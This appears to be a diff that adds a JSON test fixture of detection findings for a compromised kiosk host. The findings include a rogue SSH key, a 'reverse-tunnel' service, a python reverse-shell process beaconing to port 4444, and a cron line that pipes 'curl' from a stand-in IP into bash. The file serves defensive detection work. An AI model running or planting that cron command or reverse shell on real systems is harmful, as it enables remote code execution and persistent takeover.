@@ -1,0 +1,104 @@
+[
+  {
+    "evidence": {
+      "fingerprint": "newadmin001",
+      "line": "2",
+      "source": "/home/kiosk/.ssh/authorized_keys",
+      "type": "ssh-rsa"
+    },
+    "kind": "baseline.new_ssh_keys",
+    "severity": "critical",
+    "summary": "New SSH key observed outside baseline."
+  },
+  {
+    "evidence": {
+      "name": "reverse-tunnel.service",
+      "state": "enabled"
+    },
+    "kind": "baseline.new_services",
+    "severity": "high",
+    "summary": "New service observed outside baseline."
+  },
+  {
+    "evidence": {
+      "command": "*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash",
+      "line": "2",
+      "source": "/etc/cron.d/update"
+    },
+    "kind": "baseline.new_cron_jobs",
+    "severity": "high",
+    "summary": "New cron job observed outside baseline."
+  },
+  {
+    "evidence": {
+      "command": "*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash",
+      "line": "2",
+      "source": "/etc/cron.d/update"
+    },
+    "kind": "persistence.cron",
+    "severity": "high",
+    "summary": "Cron job executes a command pattern commonly used for persistence or remote execution."
+  },
+  {
+    "evidence": {
+      "name": "reverse-tunnel.service",
+      "state": "enabled"
+    },
+    "kind": "persistence.service",
+    "severity": "high",
+    "summary": "Startup service name matches a suspicious persistence pattern."
+  },
+  {
+    "evidence": {
+      "process": "python",
+      "protocol": "tcp",
+      "remote": "198.51.100.77:4444"
+    },
+    "kind": "connection.suspicious",
+    "severity": "high",
+    "summary": "Outbound connection targets a suspicious remote marker or port."
+  },
+  {
+    "evidence": {
+      "args": "python -c import socket,subprocess",
+      "command": "python",
+      "pid": "777",
+      "ppid": "1",
+      "user": "kiosk"
+    },
+    "kind": "baseline.new_processes",
+    "severity": "medium",
+    "summary": "New process observed outside baseline."
+  },
+  {
+    "evidence": {
+      "process": "python",
+      "protocol": "tcp",
+      "remote": "198.51.100.77:4444"
+    },
+    "kind": "baseline.new_connections",
+    "severity": "medium",
+    "summary": "New outbound connection observed outside baseline."
+  },
+  {
+    "evidence": {
+      "args": "python -c import socket,subprocess",
+      "command": "python",
+      "pid": "777",
+      "ppid": "1",
+      "user": "kiosk"
+    },
+    "kind": "persistence.process",
+    "severity": "medium",
+    "summary": "Running process includes command-line behavior worth investigating."
+  },
+  {
+    "evidence": {
+      "count": 3,
+      "remote": "198.51.100.77:4444"
+    },
+    "kind": "connection.repeated_remote",
+    "severity": "medium",
+    "summary": "Repeated outbound connections to the same remote may indicate beaconing."
+  }
+]
